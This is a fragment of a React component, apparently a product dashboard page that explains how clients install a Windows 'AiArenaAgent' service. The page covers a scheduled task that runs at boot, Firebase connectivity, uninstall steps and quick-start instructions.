      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-5">
        <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
          <ClipboardCheck className="w-4 h-4 text-emerald-400" />
          Windows Deployment Steps
        </h3>
        <div className="space-y-2">
          {steps.map((step, i) => {
            const Icon = step.icon
            const isOpen = activeStep === i
            return (
              <div
                key={i}
                className={cn(
                  'border rounded-lg transition-all duration-200 cursor-pointer',
                  isOpen ? 'border-emerald-500/30 bg-zinc-950/50' : 'border-zinc-800 hover:border-zinc-700'
                )}
                onClick={() => setActiveStep(isOpen ? null : i)}
              >
                <div className="flex items-center gap-3 px-4 py-3">
                  <div
                    className={cn(
                      'w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-bold shrink-0',
                      isOpen
                        ? 'bg-emerald-500/20 text-emerald-400'
                        : 'bg-zinc-800 text-zinc-500'
                    )}
                  >
                    {i + 1}
                  </div>
                  <Icon className="w-4 h-4 text-zinc-400 shrink-0" />
                  <div className="flex-1">
                    <span className="text-xs font-medium text-zinc-200">{step.title}</span>
                    <p className="text-[10px] text-zinc-500 hidden sm:block">{step.description}</p>
                  </div>
                  <ChevronRight
                    className={cn(
                      'w-4 h-4 text-zinc-500 transition-transform',
                      isOpen && 'rotate-90'
                    )}
                  />
                </div>
                {isOpen && (
                  <div className="px-4 pb-3">
                    <p className="text-xs text-zinc-400 mb-2">{step.description}</p>
                    <code className="block bg-zinc-950 text-emerald-400 text-xs p-3 rounded-md font-mono">
                      {step.command}
                    </code>
                  </div>
                )}
              </div>
            )
          })}
        </div>
      </div>

      {/* Unattended Access Section */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-5">
        <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <Power className="w-4 h-4 text-yellow-400" />
          Unattended Access &amp; Power Outage Recovery
        </h3>
        <div className="space-y-3 text-xs text-zinc-400">
          <div className="bg-zinc-950 rounded-lg p-3 space-y-2">
            <p className="text-zinc-300 font-medium">How it works:</p>
            <ol className="list-decimal list-inside space-y-1.5 text-zinc-400">
              <li>The <code className="text-emerald-400 bg-zinc-900 px-1 rounded">.bat</code> installer creates a Windows Task Scheduler task named &quot;AiArenaAgent&quot;</li>
              <li>This task is configured to run as <code className="text-yellow-400 bg-zinc-900 px-1 rounded">SYSTEM</code> — it starts at boot, before any user logs in</li>
              <li>When power returns after an outage, Windows boots, Task Scheduler fires the agent automatically</li>
              <li>The agent connects to Firebase Realtime Database with automatic reconnection (10s interval)</li>
              <li>Within ~30 seconds of boot, the server appears &quot;online&quot; in your Dashboard — no one on-site needed</li>
            </ol>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
              <div className="flex items-center gap-2 mb-1.5">
                <HardDrive className="w-3.5 h-3.5 text-zinc-500" />
                <span className="text-[10px] font-medium text-zinc-300">Install Location</span>
              </div>
              <code className="text-[10px] text-emerald-400 font-mono">C:\Ai-Arena\</code>
            </div>
            <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
              <div className="flex items-center gap-2 mb-1.5">
                <Terminal className="w-3.5 h-3.5 text-zinc-500" />
                <span className="text-[10px] font-medium text-zinc-300">Service Name</span>
              </div>
              <code className="text-[10px] text-emerald-400 font-mono">AiArenaAgent</code>
            </div>
            <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
              <div className="flex items-center gap-2 mb-1.5">
                <Shield className="w-3.5 h-3.5 text-zinc-500" />
                <span className="text-[10px] font-medium text-zinc-300">Communication</span>
              </div>
              <code className="text-[10px] text-yellow-400 font-mono">Firebase RTDB</code>
            </div>
          </div>
          <div className="bg-yellow-500/5 border border-yellow-500/20 rounded-lg p-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="w-4 h-4 text-yellow-500 shrink-0 mt-0.5" />
              <div>
                <p className="text-[10px] font-medium text-yellow-400">Important Notes</p>
                <ul className="text-[10px] text-zinc-500 mt-1 space-y-0.5 list-disc list-inside">
                  <li>Just double-click the .bat — it auto-requests admin via UAC (no right-click needed)</li>
                  <li>If no admin is available, it falls back to user-level auto-start (Registry/Startup folder)</li>
                  <li>Windows Firewall rules are added automatically to allow outbound Firebase connections</li>
                  <li>To uninstall: <code className="text-zinc-400">schtasks /delete /tn &quot;AiArenaAgent&quot; /f</code> then delete <code className="text-zinc-400">C:\Ai-Arena\</code></li>
                  <li>Agent logs are stored in <code className="text-zinc-400">C:\Ai-Arena\logs\</code> for troubleshooting</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Windows .bat Installer */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl overflow-hidden">
        <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800">
          <div className="flex items-center gap-2">
            <Badge className="bg-blue-500/15 text-blue-400 border-0 text-[10px]">
              <Monitor className="w-3 h-3 mr-1" />
              .bat
            </Badge>
            <span className="text-sm font-medium text-white">Windows Installer Script</span>
            <span className="text-[10px] bg-zinc-800 text-zinc-500 px-1.5 py-0.5 rounded">
              install-ai-arena.bat
            </span>
          </div>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-xs border-zinc-700 text-zinc-400 hover:text-white hover:bg-zinc-800"
              onClick={copyBat}
            >
              {copiedBat ? (
                <><Check className="w-3.5 h-3.5 mr-1.5 text-emerald-400" />Copied!</>
              ) : (
                <><Copy className="w-3.5 h-3.5 mr-1.5" />Copy</>
              )}
            </Button>
            <Button
              size="sm"
              className="h-7 text-xs bg-blue-600 hover:bg-blue-700 text-white"
              onClick={downloadBat}
            >
              <Download className="w-3.5 h-3.5 mr-1.5" />
              Download .bat
            </Button>
          </div>
        </div>
        <div className="max-h-72 overflow-y-auto">
          <pre className="p-4 text-xs font-mono text-zinc-300 leading-5 bg-zinc-950">
            <code>{batInstaller}</code>
          </pre>
        </div>
      </div>

      {/* Agent Code */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl overflow-hidden">
        <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800">
          <div className="flex items-center gap-2">
            <FileCode className="w-4 h-4 text-emerald-400" />
            <span className="text-sm font-medium text-white">Agent Source Code</span>
            <span className="text-[10px] bg-zinc-800 text-zinc-500 px-1.5 py-0.5 rounded">
              ai-arena-agent.js
            </span>
            <Badge className="bg-emerald-500/15 text-emerald-400 border-0 text-[10px]">v2.0 Firebase</Badge>
          </div>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-xs border-zinc-700 text-zinc-400 hover:text-white hover:bg-zinc-800"
              onClick={copyCode}
            >
              {copied ? (
                <><Check className="w-3.5 h-3.5 mr-1.5 text-emerald-400" />Copied!</>
              ) : (
                <><Copy className="w-3.5 h-3.5 mr-1.5" />Copy</>
              )}
            </Button>
            <Button
              size="sm"
              className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white"
              onClick={downloadAgent}
            >
              <Download className="w-3.5 h-3.5 mr-1.5" />
              Download .js
            </Button>
          </div>
        </div>
        <div className="max-h-72 overflow-y-auto">
          <pre className="p-4 text-xs font-mono text-zinc-300 leading-5 bg-zinc-950">
            <code>{agentCode}</code>
          </pre>
        </div>
      </div>

      {/* Quick Start */}
      <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-xl p-4">
        <h4 className="text-xs font-semibold text-emerald-400 mb-2">Quick Start for Clients</h4>
        <ol className="text-xs text-zinc-400 space-y-1 list-decimal list-inside">
          <li>Go to License Keys tab → Generate a new key for this server</li>
          <li>Download <code className="text-emerald-400 bg-zinc-900 px-1 rounded">install-ai-arena.bat</code> — edit the LICENSE_KEY and Firebase config at the top</li>
          <li>Download <code className="text-emerald-400 bg-zinc-900 px-1 rounded">ai-arena-agent.js</code> — save to <code className="text-zinc-400">C:\Ai-Arena\</code></li>
          <li>Right-click .bat → Run as Administrator</li>
          <li>Server appears in Dashboard within 30 seconds of boot — done!</li>
        </ol>
        <p className="text-xs text-zinc-500 mt-2">
          After power outage: Windows boots → Task Scheduler starts agent → agent connects to Firebase → server shows &quot;online&quot; in Dashboard.
          No human intervention needed, ever. All communication flows through trusted Firebase domains.
        </p>
      </div>
    </div>
  )
}
